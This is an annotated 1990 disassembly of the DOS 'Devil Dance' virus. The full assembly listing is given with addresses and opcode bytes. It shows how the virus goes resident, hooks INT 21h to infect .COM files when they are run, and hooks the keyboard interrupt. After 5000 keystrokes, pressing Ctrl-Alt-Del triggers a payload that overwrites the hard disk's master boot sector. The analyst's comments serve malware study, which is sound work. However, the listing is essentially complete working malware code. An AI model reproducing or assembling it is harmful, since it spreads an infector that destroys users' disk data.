; virus Devil Dance
;
; disassembled by Marek A. Filipiak October 31, 1990
;

0100 E9090B        JMP     0C0C

; ...
; victim code
; ...

;========================================
;          Virus entry point
;========================================

; find offset of virus code in memory

0C0C 8B360101      MOV     SI,[0101]    ; destination of first jump
0C10 81C60301      ADD     SI,0103      ; PSP + length of jump instruction

; restore victim starting code

0C14 56            PUSH    SI           ; store virus offset in memory
0C15 B90300        MOV     CX,0003      ; restore oryginal first 3 bytes
0C18 81C6A703      ADD     SI,03A7      ; address of 3 bytes
0C1C BF0001        MOV     DI,0100      ; destination
0C1F F3            REPZ
0C20 A4            MOVSB                ; move
0C21 5E            POP     SI           ; restore virus base address

0C22 E81300        CALL    0C38         ; check presence of resident part
0C25 7306          JAE     0C2D         ; return to aplication

0C27 E86503        CALL    0F8F         ; infect one file in current directory
0C2A E82A00        CALL    0C57         ; instal resident part

; return to aplication

0C2D B80001        MOV     AX,0100      ; return address
0C30 50            PUSH    AX
0C31 8CC8          MOV     AX,CS
0C33 8ED8          MOV     DS,AX
0C35 8EC0          MOV     ES,AX
0C37 C3            RET                  ; jump to aplication

;---------------------------
; is resident part active?

0C38 06            PUSH    ES
0C39 B82135        MOV     AX,3521      ; get INT 21h vector
0C3C CD21          INT     21

0C3E 26            ES:
0C3F 807FFD44      CMP     BYTE PTR [BX-03],44 ; 'D'
0C43 750F          JNZ     0C54         ; no, exit with carry and NZ

0C45 26            ES:
0C46 807FFE72      CMP     BYTE PTR [BX-02],72 ; 'r'
0C4A 7508          JNZ     0C54         ; no, exit with carry and NZ

0C4C 26            ES:
0C4D 807FFF6B      CMP     BYTE PTR [BX-01],6B ; 'k'
0C51 07            POP     ES
0C52 F8            CLC                  ; exit with no carry and Z or NZ
0C53 C3            RET

0C54 07            POP     ES
0C55 F9            STC
0C56 C3            RET

;----------------------
; instal resident part

0C57 B8004A        MOV     AX,4A00      ; change size of allocated memory
0C5A BB0010        MOV     BX,1000      ; to 64 Kb (size in paragraphs)
0C5D 0E            PUSH    CS
0C5E 1F            POP     DS
0C5F CD21          INT     21

0C61 B80048        MOV     AX,4800      ; allocate memory
0C64 BB4C00        MOV     BX,004C      ; requested size (1216 bytes)
0C67 CD21          INT     21

0C69 FC            CLD
0C6A 8EC0          MOV     ES,AX        ; segment of allocated block
0C6C 56            PUSH    SI           ; store SI
0C6D 8BDE          MOV     BX,SI        ; virus base
0C6F BF0301        MOV     DI,0103      ; destination
0C72 B9AD03        MOV     CX,03AD      ; virus size (941)
0C75 F3            REPZ
0C76 A4            MOVSB                ; move to new place

; first 103 bytes of allocated block serve for virus working area

0C77 26            ES:
0C78 C70600000301  MOV     WORD PTR [0000],0103  ; virus base in moved code

0C7E 5E            POP     SI           ; restore SI (virus base)
0C7F 1E            PUSH    DS           ; store current DS
0C80 06            PUSH    ES           ; store virus ES
0C81 8CC0          MOV     AX,ES
0C83 48            DEC     AX           ; segment of MCB
0C84 8EC0          MOV     ES,AX
0C86 26            ES:
0C87 C70601000600  MOV     WORD PTR [0001],0006  ; paragraph of block owner

0C8D 07            POP     ES           ; restore virus ES
0C8E 8CC0          MOV     AX,ES        ; set DS to new virus segment
0C90 8ED8          MOV     DS,AX
0C92 B82135        MOV     AX,3521      ; get INT 21h
0C95 CD21          INT     21

0C97 891E0200      MOV     [0002],BX    ; store INT 21h
0C9B 8C060400      MOV     [0004],ES
0C9F BA9B03        MOV     DX,039B      ; offset of new handler (here 0EA4h)
0CA2 B82125        MOV     AX,2521      ; set INT 21h
0CA5 CD21          INT     21

0CA7 B80935        MOV     AX,3509      ; get INT 09h
0CAA CD21          INT     21

0CAC 891E0600      MOV     [0006],BX    ; store it
0CB0 8C060800      MOV     [0008],ES

0CB4 C70620000000  MOV     WORD PTR [0020],0000 ; reset Alt keystroke counter
0CBA C606150000    MOV     BYTE PTR [0015],00   ; reset flag ??

0CBF B80925        MOV     AX,2509      ; set INT 09h (keyboard)
0CC2 BAC001        MOV     DX,01C0      ; offset of new handler (here 0CC9)
0CC5 CD21          INT     21

0CC7 1F            POP     DS           ; restore carrier DS
0CC8 C3            RET

;-----------------------------
; INT 09h handler (keyboard)

0CC9 CC            INT     3            : ?? destroyed by some debugger ??
0CCA FB            STI
0CCB 50            PUSH    AX           ; store AX
0CCC 1E            PUSH    DS           ; and DS
0CCD 33C0          XOR     AX,AX        ; set DS to 0
0CCF 8ED8          MOV     DS,AX
0CD1 A01704        MOV     AL,[0417]    ; BIOS, shift status
0CD4 2408          AND     AL,08        ; extract Alt key
0CD6 3C08          CMP     AL,08        ; is active?
0CD8 7503          JNZ     0CDD         ; not presed

0CDA E98300        JMP     0D60         ; check for Del key

0CDD 2E            CS:
0CDE FF062000      INC     WORD PTR [0020]  ; keystroke counter
0CE2 2E            CS:
0CE3 803E150001    CMP     BYTE PTR [0015],01  ; ?? flag ??
0CE8 740B          JZ      0CF5

0CEA 2E            CS:
0CEB 833E20000A    CMP     WORD PTR [0020],+0A ; exactly 10 keys were presed?
0CF0 7403          JZ      0CF5         ; yes

; exit

0CF2 EB64          JMP     0D58         ; exit to true INT 9
0CF4 90            NOP

; exactly ten keys has been presed or flag [0015] has been set
; change attribute at curent cursor position

0CF5 52            PUSH    DX
0CF6 56            PUSH    SI
0CF7 53            PUSH    BX
0CF8 06            PUSH    ES
0CF9 51            PUSH    CX
0CFA BE0301        MOV     SI,0103      ; virus base
0CFD 81C62202      ADD     SI,0222      ; encrypted part of code (here 0E2Eh)
0D01 2E            CS:
0D02 C606150001    MOV     BYTE PTR [0015],01 ; set flag
0D07 2E            CS:
0D08 8B1E2B03      MOV     BX,[032B]    ; (here 0E34h)
0D0C 2E            CS:
0D0D FF062B03      INC     WORD PTR [032B] ; increase attribute counter
0D11 81FB2B03      CMP     BX,032B
0D15 7302          JAE     0D19         ; skip counter reset

0D17 EB0A          JMP     0D23

0D19 2E            CS:
0D1A C7062B032503  MOV     WORD PTR [032B],0325 ; reset counter
0D20 BB2503        MOV     BX,0325      ; set BX to new value

0D23 CD11          INT     11           ; equipment list

0D25 2430          AND     AL,30        ; video monitor
0D27 3D3000        CMP     AX,0030      ; monochrome
0D2A 7505          JNZ     0D31         ; no

; mistake!

0D2C B800B8        MOV     AX,B800      ; should be B000
0D2F EB03          JMP     0D34

0D31 B800B8        MOV     AX,B800      ; segment of video RAM

0D34 8EC0          MOV     ES,AX        ; initialize ES (video RAM)
0D36 2E            CS:
0D37 8A07          MOV     AL,[BX]      ; number between 09 .. 0E
0D39 50            PUSH    AX

; find screen address of current cursor position

0D3A A15004        MOV     AX,[0450]    ; (DS = 0) get current cursor position
0D3D 86E0          XCHG    AL,AH        ; swap column, row
0D3F 8ADC          MOV     BL,AH        ; row
0D41 32E4          XOR     AH,AH        ; AX := row
0D43 32FF          XOR     BH,BH        ; BX := column
0D45 B9A000        MOV     CX,00A0      ; 160, length of one line
0D48 F7E1          MUL     CX
0D4A D1E3          SHL     BX,1         ; mulitply by 2
0D4C 03D8          ADD     BX,AX

0D4E 43            INC     BX           ; attribute field
0D4F 58            POP     AX           ; restore choosen attribute
0D50 26            ES:
0D51 8807          MOV     [BX],AL      ; put it on the screen

; exit

0D53 59            POP     CX
0D54 07            POP     ES
0D55 5B            POP     BX
0D56 5E            POP     SI
0D57 5A            POP     DX

0D58 1F            POP     DS
0D59 58            POP     AX
0D5A FA            CLI
0D5B 2E            CS:
0D5C FF2E0600      JMP     FAR [0006]   ; true INT 9

; Alt key is presed

0D60 E460          IN      AL,60        ; read keyboard scan code
0D62 3C53          CMP     AL,53        ; Del?
0D64 7407          JZ      0D6D         ; yes, procede

; exit to true INT 9

0D66 1F            POP     DS
0D67 58            POP     AX
0D68 2E            CS:
0D69 FF2E0600      JMP     FAR [0006]

; Alt + Del service

0D6D CD11          INT     11           ; equipment list

; again mistake! Decimaly 48 is 30 in hex

0D6F 254800        AND     AX,0048      ; ??
0D72 3D4800        CMP     AX,0048      ; ??
0D75 7505          JNZ     0D7C

; in hex 0048 meant system with 2 disketts (bit 40) and bit 8 is reserved
; (on PC, XT and Jr it and bit 4 reflect size of RAM on system board in 16 K)
; so probably AX and 48 almost always will be equol 48.

0D77 B800B0        MOV     AX,B000      ; monochrome
0D7A EB03          JMP     0D7F

0D7C B800B8        MOV     AX,B800      ; other

0D7F 8EC0          MOV     ES,AX        ; initial ES to video segment
0D81 8CC8          MOV     AX,CS        ; restore DS
0D83 8ED8          MOV     DS,AX
0D85 33FF          XOR     DI,DI        ; clear screen location pointer
0D87 B407          MOV     AH,07        ; attribute
0D89 B0B1          MOV     AL,B1        ; chracter ± (177)
0D8B B9D007        MOV     CX,07D0      ; size of screen
0D8E F3            REPZ
0D8F AB            STOSW                ; fill screen with box character 

; display first part of mesage: Have you ever danced ...

0D90 BF4A06        MOV     DI,064A      ; offset of column 10, row 10
0D93 BE3103        MOV     SI,0331      ; offset of message

0D96 AC            LODSB                ; get next character
0D97 2C80          SUB     AL,80        ; decrypt
0D99 0AC0          OR      AL,AL        ; end of string?
0D9B 740D          JZ      0DAA         ; yes

0D9D B40F          MOV     AH,0F        ; attribute
0D9F AB            STOSW                ; put on screen 
0DA0 B900A0        MOV     CX,A000      ; constant for pause

0DA3 050100        ADD     AX,0001      ; small pause
0DA6 E2FB          LOOP    0DA3

0DA8 EBEC          JMP     0D96         ; disply next character

; display next message: Pray for your disk!

0DAA BF7008        MOV     DI,0870      ; row 13, column 40
0DAD BE7703        MOV     SI,0377
0DB0 AC            LODSB

0DB1 2C80          SUB     AL,80
0DB3 0AC0          OR      AL,AL
0DB5 740D          JZ      0DC4

0DB7 B40F          MOV     AH,0F
0DB9 AB            STOSW

0DBA B900A0        MOV     CX,A000

0DBD 050100        ADD     AX,0001
0DC0 E2FB          LOOP    0DBD

0DC2 EBEC          JMP     0DB0

; disply third part of message, The_Jocker...

0DC4 BFB009        MOV     DI,09B0      ; row 15, column 40
0DC7 BE8B03        MOV     SI,038B

0DCA AC            LODSB
0DCB 2C80          SUB     AL,80        ; decrypt
0DCD 0AC0          OR      AL,AL        ; end of string?
0DCF 740D          JZ      0DDE         ; yes

0DD1 B40F          MOV     AH,0F        ; attribute
0DD3 AB            STOSW

0DD4 B900A0        MOV     CX,A000      ; time constant

0DD7 050100        ADD     AX,0001      ; small pause
0DDA E2FB          LOOP    0DD7

0DDC EBEC          JMP     0DCA         ; get next character

; diplay the rest: Ha Ha Ha ...

0DDE BA1E00        MOV     DX,001E      ; starting column (15)
0DE1 B90A00        MOV     CX,000A      ; counter

0DE4 51            PUSH    CX
0DE5 BF400B        MOV     DI,0B40      ; row 18, column 1
0DE8 52            PUSH    DX
0DE9 D1E2          SHL     DX,1         ; DX := 3C
0DEB 03FA          ADD     DI,DX        ; move coursor 30 characters right
0DED 5A            POP     DX
0DEE BE2D03        MOV     SI,032D      ; offset of 'Ha ',0

0DF1 AC            LODSB                ; get next character
0DF2 2C80          SUB     AL,80        ; decrypt
0DF4 0AC0          OR      AL,AL        ; end of string
0DF6 740D          JZ      0E05         ; yes

0DF8 B40F          MOV     AH,0F        ; attribute
0DFA AB            STOSW                ; display

0DFB B900A0        MOV     CX,A000      ; time constant

0DFE 050100        ADD     AX,0001      ; small pause
0E01 E2FB          LOOP    0DFE

0E03 EBEC          JMP     0DF1         ; get next character

0E05 83C203        ADD     DX,+03       ; move cursor 3 positions right
0E08 59            POP     CX           ; restore counter
0E09 E2D9          LOOP    0DE4

0E0B B020          MOV     AL,20        ; enable hardware interrupts
0E0D E620          OUT     20,AL

0E0F 2E            CS:
0E10 813E20008813  CMP     WORD PTR [0020],1388   ; 5000 keystrokes
0E16 7305          JAE     0E1D         ; perform destruction

0E18 EAF0FF00F0    JMP     F000:FFF0    ; cold reset

0E1D B80000        MOV     AX,0000      ; reset disk
0E20 CD13          INT     13

; overwrite Master Boot Sector of first hard drive

0E22 B80103        MOV     AX,0301      ; write one sector
0E25 33C9          XOR     CX,CX
0E27 41            INC     CX           ; track 0, sector 1
0E28 33D2          XOR     DX,DX        ; head 0
0E2A B280          MOV     DL,80        ; first hard drive
0E2C CD13          INT     13

; after destruction computer will crush trying execute working area bytes

;--------------
; working area

0E2E 09 0A 0B 0C 0D 0E     ; [0325],... set of attributes to put onto screen
0E34 26 03                 ; counter, points at one out of six above bytes

; encrypted ASCIIZ strings (to any character 80h is added)

0E36 C8 E1 A0 80  ;  encrypted 'Ha ',0

0E3A                                C8 E1 F6 E5 A0 F9             Have y
0E40  EF F5 A0 E5 F6 E5 F2 A0 E4 E1 EE E3 E5 E4 A0 F7   ou ever danced w
0E50  E9 F4 E8 A0 F4 E8 E5 A0 E4 E5 F6 E9 EC A0 F5 EE   ith the devil un
0E60  E4 E5 F2 A0 F4 E8 E5 A0 F7 E5 E1 EB A0 EC E9 E7   der the weak lig
0E70  E8 F4 A0 EF E6 A0 F4 E8 E5 A0 ED EF EF EE BF 80   ht of the moon?.

0E80  D0 F2 E1 F9 A0 E6 EF F2 A0 F9 EF F5 F2 A0 E4 E9   Pray for your di
0E90  F3 EB A1 80                                       sk!.

0E94  D4 E8 E5 DF CA EF EB E5 F2 AE AE AE 80            The_Joker....

0EA1 44 72 6B      ; signature of virus resident part: 'Drk'

;-----------------------------
; new INT 21h handler

0EA4 9C            PUSHF
0EA5 3D004B        CMP     AX,4B00      ; Load and execute
0EA8 7420          JZ      0ECA

0EAA 80FC49        CMP     AH,49        ; free allocated memory
0EAD 7403          JZ      0EB2

0EAF EB13          JMP     0EC4         ; exit to old INT 21h
0EB1 90            NOP

; free allocated memory service

0EB2 50            PUSH    AX
0EB3 53            PUSH    BX
0EB4 8CC8          MOV     AX,CS        ; compare requested block with
0EB6 8CC3          MOV     BX,ES        ; block actualy ocupied by virus
0EB8 3BD8          CMP     BX,AX
0EBA 5B            POP     BX
0EBB 58            POP     AX
0EBC 7506          JNZ     0EC4         ; blocks are different, exit

0EBE F8            CLC                  ; clear carry (no error!)
0EBF 8CC0          MOV     AX,ES        ; put own segment into AX
0EC1 CA0200        RETF    0002

; exit to old INT 21h

0EC4 9D            POPF
0EC5 2E            CS:
0EC6 FF2E0200      JMP     FAR [0002]

; load and execute service

0ECA 55            PUSH    BP
0ECB 50            PUSH    AX
0ECC 53            PUSH    BX
0ECD 51            PUSH    CX
0ECE 52            PUSH    DX
0ECF 1E            PUSH    DS
0ED0 06            PUSH    ES
0ED1 56            PUSH    SI
0ED2 57            PUSH    DI

0ED3 FC            CLD
0ED4 8BF2          MOV     SI,DX        ; ASCIIZ file name

0ED6 AC            LODSB                ; find end of file name
0ED7 0AC0          OR      AL,AL        ; end of string? 
0ED9 7402          JZ      0EDD         ; yes

0EDB EBF9          JMP     0ED6         ; get next character

0EDD 83EE04        SUB     SI,+04       ; point at first char of extension
0EE0 803C43        CMP     BYTE PTR [SI],43  ; 'C' is it COM file
0EE3 7502          JNZ     0EE7         ; maybe lower case?

0EE5 7405          JZ      0EEC         ; infect

0EE7 803C63        CMP     BYTE PTR [SI],63  ; 'c'
0EEA 752B          JNZ     0F17         ; exit

; prepare infection

0EEC B42F          MOV     AH,2F        ; get DTA
0EEE CD21          INT     21

0EF0 06            PUSH    ES
0EF1 53            PUSH    BX
0EF2 52            PUSH    DX
0EF3 1E            PUSH    DS
0EF4 0E            PUSH    CS
0EF5 1F            POP     DS
0EF6 BA8000        MOV     DX,0080      ; offset of local DTA
0EF9 B41A          MOV     AH,1A        ; set DTA
0EFB CD21          INT     21

; get date of loaded file into local DTA

0EFD 1F            POP     DS
0EFE 5A            POP     DX           ; offset of file name
0EFF B44E          MOV     AH,4E        ; find first
0F01 B92300        MOV     CX,0023      ; attributes: Subdir, Hiden, Read Only
0F04 CD21          INT     21

0F06 8CC8          MOV     AX,CS
0F08 8ED8          MOV     DS,AX
0F0A 8B360000      MOV     SI,[0000]

0F0E E81500        CALL    0F26         ; infect file

0F11 5A            POP     DX
0F12 1F            POP     DS
0F13 B41A          MOV     AH,1A        ; restore DTA
0F15 CD21          INT     21

0F17 5F            POP     DI
0F18 5E            POP     SI
0F19 07            POP     ES
0F1A 1F            POP     DS
0F1B 5A            POP     DX
0F1C 59            POP     CX
0F1D 5B            POP     BX
0F1E 58            POP     AX
0F1F 5D            POP     BP
0F20 9D            POPF
0F21 2E            CS:
0F22 FF2E0200      JMP     FAR [0002]   ; exit to old INT 21h

;-------------
; infect file

0F26 33C9          XOR     CX,CX        ; clear all attributes
0F28 B80143        MOV     AX,4301      ; set attributes
0F2B BA9E00        MOV     DX,009E      ; fille name (in carrier DTA!)
0F2E 33C9          XOR     CX,CX        ; ?? again ??
0F30 CD21          INT     21

0F32 B8023D        MOV     AX,3D02      ; open file for read/write
0F35 BA9E00        MOV     DX,009E      ; file name
0F38 CD21          INT     21

0F3A 8BD8          MOV     BX,AX        ; store handle
0F3C 7301          JAE     0F3F         ; no error

0F3E C3            RET

0F3F B43F          MOV     AH,3F        ; read file
0F41 B90300        MOV     CX,0003      ; 3 bytes
0F44 8BD6          MOV     DX,SI        ; virus base
0F46 81C2A703      ADD     DX,03A7      ; buffer for oryginal 3 bytes
0F4A CD21          INT     21

0F4C 7305          JAE     0F53         ; no error

0F4E B43E          MOV     AH,3E        ; close file
0F50 CD21          INT     21

0F52 C3            RET

0F53 B80042        MOV     AX,4200      ; move file pointer
0F56 33C9          XOR     CX,CX        ; at the beginning
0F58 8BD1          MOV     DX,CX        ; of file
0F5A CD21          INT     21

0F5C A19A00        MOV     AX,[009A]    ; get file length
0F5F 2D0300        SUB     AX,0003      ; sub first 3 bytes
0F62 2E            CS:
0F63 8984AB03      MOV     [SI+03AB],AX ; size of block to write
0F67 8BD6          MOV     DX,SI
0F69 81C2AA03      ADD     DX,03AA
0F6D B440          MOV     AH,40        ; write to file
0F6F B90300        MOV     CX,0003      ; new first 3 bytes
0F72 CD21          INT     21

0F74 7302          JAE     0F78         ; continue

0F76 EBD6          JMP     0F4E         ; error, exit

0F78 B80242        MOV     AX,4202      ; move file pointer
0F7B 33C9          XOR     CX,CX        ; at the end
0F7D 8BD1          MOV     DX,CX        ; of file
0F7F CD21          INT     21

0F81 B440          MOV     AH,40        ; write file 
0F83 B9AD03        MOV     CX,03AD      ; number of bytes (941)
0F86 8BD6          MOV     DX,SI        ; address of virus first byte 
0F88 CD21          INT     21

0F8A B43E          MOV     AH,3E        ; close file
0F8C CD21          INT     21

0F8E C3            RET

;----------------------------------------------
; find file in current directory and infect it

0F8F B44E          MOV     AH,4E        ; find first
0F91 B92300        MOV     CX,0023      ; attributes: Archive, Hiden, Read Only
0F94 8BD6          MOV     DX,SI
0F96 81C2A103      ADD     DX,03A1      ; file name: *.COM
0F9A CD21          INT     21

0F9C 7303          JAE     0FA1         ; infect

0F9E EB0C          JMP     0FAC         ; RET
0FA0 90            NOP

0FA1 E882FF        CALL    0F26         ; infect

0FA4 B44F          MOV     AH,4F        ; find next
0FA6 CD21          INT     21
0FA8 7202          JB      0FAC         ; RET

0FAA EBF5          JMP     0FA1         ; infect

0FAC C3            RET


0FAD 2A 2E 63 6F 6D 00     ; *.COM, 0
0FB3 E9 5C 07              ; oryginal 3 bytes of carrier COM file

; end of infected file
;----------------------

